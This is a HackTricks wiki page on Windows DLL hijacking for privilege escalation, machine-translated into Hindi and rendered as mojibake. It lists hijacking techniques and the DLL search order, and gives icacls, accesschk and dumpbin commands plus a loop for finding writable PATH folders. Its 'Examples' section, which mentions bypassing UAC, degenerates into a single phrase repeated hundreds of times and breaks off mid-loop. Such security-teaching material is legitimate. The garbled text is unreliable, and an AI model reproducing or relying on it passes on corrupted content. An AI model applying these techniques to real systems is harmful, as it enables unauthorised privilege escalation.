# Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдЕрдЧрд░ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрдиреЗ рдФрд░ рдмреЛрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ_).

{% embed url="https://www.stmcyber.com/careers" %}

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рд▓рдВрдмрд┐рдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рд╢рдмреНрдж рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ **DLL рд╕реНрдкреВрдлрд┐рдВрдЧ, рдЗрдВрдЬреЗрдХреНрд╢рди, рдФрд░ рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ**ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди, рд╕реНрдерд┐рд░рддрд╛ рдкреНрд░рд╛рдкреНрддрд┐ рдФрд░, рдХрдо рдЖрдорддреМрд░ рдкрд░, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдЙрдиреНрдирддрд┐ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд╛ рддрд░реАрдХрд╛ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рдЕрд╡рд┐рд░рд▓ рд░рд╣рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдорд╛рди рд░рд╣рддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХреЗрдВ

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдХреА рдкреНрд░рднрд╛рд╡рдХрд╛рд░рд┐рддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ DLL рд▓реЛрдбрд┐рдВрдЧ рд░рдгрдиреАрддрд┐ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ:

1. **DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕реЗ рдмрджрд▓рдирд╛, рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ DLL рдкреНрд░реЙрдХреНрд╕реАрдЗрдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореВрд▓ DLL рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред
2. **DLL рдЦреЛрдЬ рдХреНрд░рдо рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЗ рдЖрдЧреЗ рдПрдХ рдЦреЛрдЬ рдкрде рдореЗрдВ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЦреЛрдЬ рдкреИрдЯрд░реНрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ред
3. **рдлреИрдВрдЯрдо DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдмрдирд╛рдирд╛ рдЬрд┐рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рдХрд░реЗрдЧрд╛, рд╕реЛрдЪрддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдЖрд╡рд╢реНрдпрдХ DLL рд╣реИред
4. **DLL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди**: `%PATH%` рдпрд╛ `.exe.manifest` / `.exe.local` рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреИрд╕реЗ рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдкрд░ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдд рдХрд░рдирд╛ред
5. **WinSxS DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: WinSxS рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕рдВрдмрдВрдзрд┐рддрдХрд╛рд░реА рд╕реЗ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛, рдПрдХ рддрдХрдиреАрдХ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ DLL рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред
6. **рд╕рд╛рдкреЗрдХреНрд╖ рдкрде DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдЙрдкрдпреЛрдХреНрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдХреЙрдкреА рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде рдмрд┐рдирд░реА рдкреНрд░реЙрдХреНрд╕реА рдирд┐рд╖реНрдкрд╛рджрди рддрдХрдиреАрдХреЛрдВ рдХреА рддрд░рд╣ред


## рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдирд╛

рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) рдХреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдЪрд▓рд╛рдирд╛ рд╣реИ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 2 рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░реЗрдВ**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

рдФрд░ рдмрд╕ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдЧрддрд┐рд╡рд┐рдзрд┐** рджрд┐рдЦрд╛рдПрдВ:

![](<../../.gitbook/assets/image (314).png>)

рдпрджрд┐ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рдореЗрдВ рдЧрд╛рдпрдм dlls рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рд╕реЗрдХрдВрдбреНрд╕ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЪрд▓рдиреЗ рджреЗрдВ**ред\
рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ executable рдореЗрдВ рдЧрд╛рдпрдм dll рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **"рдкреНрд░реЛрд╕реЗрд╕ рдирд╛рдо" "рд╢рд╛рдорд┐рд▓ рд╣реИ" "<exec рдирд╛рдо>" рдЬреИрд╕рд╛ рдПрдХ рдФрд░ рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдЪрд▓рд╛рдПрдВ, рдФрд░ рдШрдЯрдирд╛рдУрдВ рдХреЛ рд░реЛрдХреЗрдВ**ред

## рдЧрд╛рдпрдм Dlls рдХрд╛ рд╢реЛрд╖рдг

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдореМрдХрд╛ рд╣реИ рдХрд┐ **рд╣рдо рдПрдХ dll рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧреА** рдХрд┐рд╕реА **рд╕реНрдерд╛рди рдкрд░ рдЬрд╣рд╛рдВ рдпрд╣ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рд╣рдореЗрдВ **рдПрдХ dll рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА** рдЬрд┐рд╕реЗ рдПрдХ **рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХреЗрдВ** рдЬрд╣рд╛рдВ **рдореВрд▓ dll рд╕реЗ рдкрд╣рд▓реЗ рдЦреЛрдЬреА рдЬрд╛рдПрдЧреА** (рдЕрдЬреАрдм рдорд╛рдорд▓рд╛), рдпрд╛ рд╣рдореЗрдВ **рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА** рдЬрд╣рд╛рдВ **dll рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреА** рдФрд░ рдореВрд▓ **dll рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**ред

### Dll рдЦреЛрдЬ рдХреНрд░рдо

[**рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реА**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **рдХреЗ рдЕрдВрджрд░ рдЖрдк рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреИрд╕реЗ Dlls рд▓реЛрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЗрд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред**

**Windows рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреНрд░рдорд╛рдиреБрд╕рд╛рд░ рдПрдХ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде DLLs рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рдХреНрд░рдо рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВред DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреА рд╕рдорд╕реНрдпрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DLL рдЗрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рд░рдгрдиреАрддрд┐рдХ рд░реВрдк рд╕реЗ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдореВрд▓ DLL рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЙрди DLLs рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдЯреАрдХ рдкрдереЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдЬрд┐рдирдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЖрдк **32-рдмрд┐рдЯ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдкрд░ DLL рдЦреЛрдЬ рдХреНрд░рдо** рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬрд┐рд╕рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
2. рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред(_C:\Windows\System32_)
3. 16-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред (_C:\Windows\System_)
4. Windows рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
1. (_C:\Windows_)
5. рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
6. PATH рдкрд░реНрдпрд╛рд╡рд░рдг
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
рдФрд░ **рдкрде рдХреЗ рд╕рднреА рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЖрдк рдПрдХ executable рдХреЗ imports рдФрд░ рдПрдХ dll рдХреЗ exports рдХреА рдЬрд╛рдБрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП **Dll Hijacking рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕рд┐рд╕реНрдЯрдо рдкрде рдлреЛрд▓реНрдбрд░** рдореЗрдВ рд▓реЗрдЦрди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рд┐рд╕реНрдЯрдо PATH рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓реЗрдЦрди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред\
рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рддрддрд╛ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рд░реЛрдЪрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИрдВ **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ рдФрд░ _Write-HijackDll._

### рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдк рдПрдХ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдХреЛ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ **(UAC рдХреЛ рдЫрд▓рдХрд░)** рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ 